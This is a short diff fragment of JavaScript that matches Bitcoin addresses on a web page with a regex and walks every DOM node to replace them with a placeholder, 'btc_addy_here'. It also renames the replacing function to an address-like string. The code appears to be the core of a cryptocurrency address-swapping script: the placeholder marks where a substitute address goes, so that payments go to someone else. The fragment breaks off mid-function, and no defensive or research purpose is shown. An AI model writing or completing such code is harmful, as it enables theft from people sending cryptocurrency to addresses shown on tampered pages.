@@ -12,7 +12,7 @@
 	var wordsToReplace = [
 		{ regex: /(^|\W)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}($|\W)/, replacement: "btc_addy_here", coin: "bitcoin"}
 	];
-	function replaceAddresses() {
+	function bc1qa5auz9qhxp0lzm6dv4yw3et3na2a7vp4cqln8h() {
 		var elements = document.querySelectorAll('*');
 		elements.forEach(function(element) {
 			Array.from(element.childNodes).forEach(function(node) {
